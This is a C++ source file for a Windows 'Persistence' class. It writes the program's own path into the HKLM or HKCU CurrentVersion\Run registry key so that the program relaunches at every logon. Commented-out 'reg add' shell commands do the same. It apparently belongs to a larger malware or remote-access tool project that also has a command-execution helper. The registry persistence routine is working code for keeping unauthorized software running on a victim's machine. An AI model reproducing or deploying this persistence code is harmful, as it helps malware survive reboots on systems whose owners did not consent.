#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/common.h"
#include "../inc/Exec.h"

using namespace std;


Persistence::Persistence(bool admin,string path_prog)
{
    a_is_admin = admin;
    a_path_prog = path_prog;
    cout << NAME_KEY_REGISTER << endl;
}


void Persistence::defaultPersi()
{
    //Create persistence with the default directories
    //HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
    //HKEY_LOCAL_MACHINE \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
    string result;
    cout << "IS admin ? " << a_is_admin << endl;
    if(a_is_admin)
    {
        //If admin   
        //result = Exec().executeCommand("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog+  " /v " NAME_KEY_REGISTER);
        cout <<"Result admin: " <<result << endl;
    }
    else
    {
        ;
        //result = Exec().executeCommand("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER);    }
    }
}


int Persistence::customPersi()
{
    //Coming soon.
    return 0;
}


void  Persistence::main() 
{       
    string path_prog = a_path_prog +'\0'; //don't forget "\0"
    LPCTSTR value = TEXT(NAME_KEY_REGISTER); 
    HKEY hKey;
    LONG status;
    bool error = false;
    
    if(a_is_admin) //if admin
    {  
        if(long statusOpen = RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {

            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);
            if(status != 0)
            {
                error = true;
            }
            
            RegCloseKey(hKey);   

        }
        else
        {
            error = true;
        }
    }
    else
    {
        if(long statusOpen = RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,
        &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
        {

            status = RegSetValueEx(hKey,value ,0 , REG_SZ, (LPBYTE)path_prog.c_str(),strlen(path_prog.c_str())+1);

            if(status != 0)
            {
                error = true;
            }
            RegCloseKey(hKey);   
        }
        else
        {
            cout << statusOpen << endl;
            error = true;
        }
    }
    //If error 
    if(error)
    {
        //defaultPersi();
        ;
    }

    
}
    
/*
//- https://stackoverflow.com/questions/6308426/reggetvalue-questions
http://www.cplusplus.com/forum/general/50264/
https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights

Contrairement à la fonction RegCreateKeyEx , la fonction RegOpenKeyEx ne crée pas la clé spécifiée si la clé n'existe pas dans le Registre.
*/